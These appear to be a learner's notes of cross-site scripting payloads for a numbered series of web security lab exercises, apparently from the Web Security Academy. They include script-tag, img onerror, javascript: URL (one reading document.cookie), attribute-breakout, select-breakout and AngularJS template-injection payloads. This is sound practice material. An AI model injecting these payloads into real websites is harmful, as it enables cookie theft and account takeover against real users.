### Class 1
```r

#In the search
<script>alert("XSS");</script>
```
### Class 2
```r
#In the comment
<script>alert("XSS");</script>
```
### Class 3
```r
#In the search
"><script>alert(0)</script>

```
### Class 4
```r
#In the search
<img src=o onerror=alert(0)>

```
### Class 5
```r
#In the url
javascript:alert(document.cookie)

```
### Class 6
```r
<iframe src="https://0a7200c80328988c81608f0400a7003d.web-security-academy.net/#" onload="this.src +='<img src=0 onerror=print()>'"></iframe>
```


### Class 7
```r
#In the search
" onmouseover="alert(0)

```

### Class 8
```r
#In the url form
javascript: alert(0)

```

### Class 9
```r
#In the search
esting'; alert(0);var testing='probando

tes';alert(0)//
```

### Class 10
```r
#In the url
</option></select><script>alert(0)</script>

```

### Class 11
```r
#Githud
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master

{{constructor.constructor('alert(1)')()}}

hol\"*alert(0)}//

```

### Class 12
```r

### Reflected DOM XSS

hola\"*alert(0)}//
```


### Class 13
```r

### Reflected DOM XSS

<>img src=0 onerror =alert(0) >
```